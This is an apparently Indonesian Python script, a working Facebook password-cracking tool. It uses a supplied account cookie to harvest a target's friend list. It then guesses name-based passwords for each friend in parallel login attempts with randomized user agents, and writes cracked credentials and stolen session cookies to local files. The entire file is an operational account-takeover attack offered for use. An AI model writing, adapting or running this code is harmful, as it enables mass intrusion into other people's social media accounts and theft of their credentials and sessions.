import requests, re, os, random, sys, time, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

from rich import print as prints
from datetime import datetime
from rich.tree import Tree

ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year
class Brute:

    def __init__(self):
        self.ugen, self.iid2 = [], []
        self.ok, self.cp, self.loop = [], [], 0
        self.ses, self.id=requests.Session(), []
        self.dump_id()

    def convert(self, uid):
        if "me" in uid:
            return {"uid":uid}
        elif(re.findall("\w+",uid)):
            xxx = self.ses.get(f"https://mbasic.facebook.com/{uid}?_rdr").text
            try:
                user = re.findall('\;rid\=(\d+)\&',str(xxx))[0]
            except:
                user = uid
        return {"uid":user}

    def ua_set(self):
        rr= random.randint
        return (f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}.{str(rr(7,12))}; Redmi Note {str(rr(7,12))} Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80,105))}.0.{str(rr(1111,4444))}.{str(rr(111,400))} Mobile Safari/537.36")

    def logo(self):
        if "linux" in sys.platform.lower():
            try:os.system("clear")
            except:pass
        elif "win" in sys.platform.lower():
            try:os.system("cls")
            except:pass
        else:
            try:os.system("clear")
            except:pass
        print("""
                   _ _       \ \\
        .-------. / \_> /\    |/
       /         \.'`  `',.--//
     -(           I      I  @@\\
       \         /'.____.'\___|    ╔╦╗╔╗ ╔═╗
        '-.....-' __/ | \   (`)    ║║║╠╩╗╠╣
                 /   /  /          ╩ ╩╚═╝╚
                     \  \    CODE BY FAZRY SABLENK
        --------------------------------------------------------""")
    def kentod(self, integer):
        lis = list("1234567890")
        gets = [random.choice(lis) for _ in range(integer)]
        return "".join(gets).upper()

    def ngoxok(self, cooz):
        coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=en_GB" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
        return(str(coki))

    def metode(self, user, pasw, cebok):
        prog.update(des,description=f"{str(self.loop)}/{len(self.id)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                uas=self.ua_set()
                ses=requests.Session()
                head = {"Host": cebok, "upgrade-insecure-requests": "1", "user-agent":  uas, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with":  "com.opera.mini.native", "sec-fetch-site": "none", "sec-fetch-mode":  "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                link = ses.get(f"https://{cebok}/?ref=opera_speed_dial",headers=head).text
                date = {"lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(link)).group(1), "next": f"https://{cebok}/login/save-device/?login_source=login#_=_", "email": user, "pass": pw} #100084616986250|sungsang
                headd = {"Host": cebok, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": uas, "content-type":  "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{cebok}", "x-requested-with": "com.opera.mini.native", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer":  f"https://{cebok}/?ref=opera_speed_dial", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                bz = ses.post(f"https://{cebok}/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=date, headers=headd, allow_redirects=False)
                if "c_user" in ses.cookies.get_dict():
                    digi = random.choice([2])
                    digi = self.kentod(digi)
                    coki = self.ngoxok(ses.cookies.get_dict())
                    user = re.search('c_user=(.*?);', coki).group(1)
                    tree = Tree(" ")
                    tree.add(f"RESULTS OK {ha} {op} {ta}").add(f"[bold green]{user}|{pw}")
                    tree.add(f"[bold green]{coki}ua={digi}").add(f"[bold blue]{uas}[/]")
                    prints(tree)
                    wrt = " [✓] "+user+"|"+pw+"|"+coki
                    self.ok.append(wrt)
                    with open(f"ok.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                    tree = Tree(" ")
                    tree.add(f"RESULTS CP {ha} {op} {ta}").add(f"[bold yellow]{user}|{pw}")
                    tree.add(f"[bold red]{uas}[/]")
                    prints(tree)
                    wrt = " [×] "+user+"|"+pw
                    self.cp.append(wrt)
                    with open("cp.txt", "a", encoding="utf-8") as w:
                        w.write(wrt+"\n")
                    break
                else:
                    continue
            except Exception as e:
                prints(e)

        self.loop += 1

    def login_cokie(self,cok):
        try:
            data = self.ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cok})
            find_token = re.search("(EAAG\w+)", data.text)
            get = self.ses.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(find_token.group(1)),cookies={"cookie": cok}).json()
            nama = get["name"]
            open('.token.txt', 'a').write(find_token.group(1))
            open('.cokie.txt', 'a').write(cok)
            prints()
            prints(f"""[[green]✓[/]] selamat [green]{nama}[/] cookie kamu valid!
[[bold red]>[/]] gunakan dengan bijak yah tools nya!""");time.sleep(0.3)
            exit("\n[!] jalankan ulang perintah nya dengan ketik python a.py")
        except requests.exceptions.ConnectionError:
            prints("😭 Tidak ada koneksi internet");exit()
        except (KeyError,AttributeError):
            prints("😔 Cookie kamu invalid");exit()

    def dump_id(self):
        self.logo()
        try:
            cook = {"cookie": open(".cokie.txt", "r").read()};took = open(".token.txt", "r").read()
        except FileNotFoundError:
            self.cookie()
        try:
            ishx = self.ses.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(took),cookies=cook).json()
            nama = ishx["name"]
            idfb = ishx["id"]
        except requests.exceptions.ConnectionError:
            exit("😔 Tidak ada koneksi")
        except KeyError:
            try:os.remove(".cokie.txt");os.remove(".token.txt")
            except:pass
            prints("😢 opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.");time.sleep(3);self.cookie()
        print(f"""
                        nama  : {nama}
                        id fb : {idfb}
        --------------------------------------------------------""")
        try:
            print("[*] Ketik 'me' jika ingin crack dari daftar teman anda.")
            try:user = input("[*] masukan id atau username : "); uid = self.convert(user)
            except AttributeError:exit("[!] username atau id tidak benar")
            print("--------------------------------------------------------")
            tol = self.ses.get(f"https://graph.facebook.com/{uid.get('uid')}?fields=friends.fields(id,name,username).limit(5000)&access_token={took}",cookies=cook).json()
            for x in tol["friends"]["data"]:
                try:self.id.append(x["id"]+"<=>"+x["name"])
                except:self.id.append(x["username"]+"<=>"+x["name"])
                wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
                sys.stdout.write(f"\r[*] Sedang mengumpulkan id: {wr}{len(self.id)}\x1b[0m -> {wr}"+x["id"]+"\x1b[0m"),
                sys.stdout.flush()
                time.sleep(0.0050)
        except KeyError:
            exit("[!] gagal mengambil id, kemungkinan id tidaklah publik")
        print(f"\n[*] Total id: {len(self.id)}")
        for ih in self.id:
            self.iid2.insert(0, ih)
        self.password()

    def password(self):
        print(f"""        --------------------------------------------------------
                            PROSES CRACK DI MULAI
        --------------------------------------------------------""")
        global prog,des
        prog = Progress(SpinnerColumn('monkey'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(self.iid2))
        with prog:
            with YayanGanteng(max_workers=30) as bool:
                for user in self.iid2:
                    idf,nmf = user.split('<=>')[0],user.split('<=>')[1].lower()
                    frs = nmf.split(' ')[0]
                    pwv = []
                    if len(nmf)<6:
                        if len(frs)<3:
                            pass
                        else:
                            pwv.append(nmf)
                            pwv.append(frs+'1234')
                            pwv.append(frs+'321')
                    else:
                        if len(frs)<3:
                            pwv.append(nmf)
                            pwv.append(frs+'123')
                            pwv.append(frs+'12345')
                        else:
                            pwv.append(nmf)
                            pwv.append(frs+'1234')
                            pwv.append(frs+'321')
                        bool.submit(self.metode, idf, pwv, "m.facebook.com")

        exit()
    def cookie(self):
        self.logo()
        ahh = input("[?] cookie : ")
        self.login_cokie(ahh)

Brute()